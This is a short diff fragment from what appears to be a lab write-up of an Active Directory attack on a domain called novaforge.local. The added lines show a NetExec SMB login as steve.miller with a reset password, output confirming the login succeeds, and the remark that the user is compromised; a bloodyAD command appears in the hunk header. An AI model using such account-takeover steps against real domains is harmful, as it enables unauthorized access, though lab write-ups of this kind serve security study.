@@ -671,5 +671,10 @@ bloodyAD --host dc.novaforge.local -d novaforge.local -u noah.sanders -p 'Passwo
 Then ill change the password for `steve.miller` 
 
 ```python
-
+nxc smb storage.novaforge.local -u steve.miller -p 'Password123!' --smb-timeout 5    
+SMB         10.0.0.101      445    STORAGE          [*] Windows 11 / Server 2025 Build 26100 x64 (name:STORAGE) (domain:novaforge.local) (signing:True) (SMBv1:None)
+SMB         10.0.0.101      445    STORAGE          [+] novaforge.local\steve.miller:Password123!
 ```
+
+Now this user is compromised!
+
